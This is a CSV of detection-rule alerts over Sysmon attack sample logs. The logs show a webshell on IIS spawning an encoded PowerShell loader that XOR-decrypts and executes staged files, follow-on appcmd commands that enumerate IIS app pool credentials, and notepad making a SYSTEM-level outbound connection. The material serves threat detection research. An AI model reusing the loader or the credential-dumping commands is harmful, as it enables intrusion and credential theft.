2019-05-26T15:48:01.864592+00:00,Network Connection Initiated Via Notepad.EXE,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx,1,Microsoft-Windows-Sysmon,3,5420,IEWIN7,"DestinationHostname: ''
UtcTime: 2019-05-26 15:48:00.245
SourcePortName: ''
Image: C:\Windows\System32\notepad.exe
RuleName: ''
DestinationIp: 10.0.2.18
DestinationPort: 888
Protocol: tcp
SourceHostname: IEWIN7
DestinationPortName: ''
SourcePort: 49172
ProcessId: 1240
ProcessGuid: 365ABB72-B530-5CEA-0000-0010621A1100
DestinationIsIpv6: false
User: NT AUTHORITY\SYSTEM
Initiated: true
SourceIp: 10.0.2.13
SourceIsIpv6: false
"
2019-05-27T01:28:42.711005+00:00,Hacktool - EDR-Freeze Execution;Non Interactive PowerShell Process Spawned;Suspicious Encoded PowerShell Command Line;Suspicious Execution of Powershell with Base64;Suspicious PowerShell Encoded Command Patterns;Suspicious PowerShell Parent Process;Suspicious Process By Web Server Process;UAC Bypass Using NTFS Reparse Point - Process;Webshell Detection With Command Line Keywords;Webshell Hacking Activity Patterns,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5875,IEWIN7,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
Description: Windows PowerShell
TerminalSessionId: 0
ParentCommandLine: c:\windows\system32\inetsrv\w3wp.exe -ap ""DefaultAppPool"" -v ""v2.0"" -l ""webengine4.dll"" -a \\.\pipe\iisipm7486e07c-453c-4f8e-85c6-8c8e3be98cd5 -h ""C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config"" -w """" -m 0 -t 20
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 748
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C
ParentProcessGuid: 365ABB72-3251-5CEB-0000-00109E06E100
ProcessId: 2584
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
CommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\inetsrv\w3wp.exe
UtcTime: 2019-05-27 01:28:42.700
"
2019-05-27T01:29:17.000311+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5877,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3484
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6C-5CEB-0000-00107257FF00
CommandLine: '""C:\Windows\System32\InetSRV\appcmd.exe""  list vdir /text:physicalpath'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:16.960
"
2019-05-27T01:29:17.110469+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5880,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2644
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6D-5CEB-0000-0010575CFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppools /text:name'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:17.070
"
2019-05-27T01:29:17.190585+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5883,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2104
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6D-5CEB-0000-00101760FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""ERROR ( message:Configuration error "" /text:processmodel.username'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:17.150
"
2019-05-27T01:29:17.270700+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5886,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAG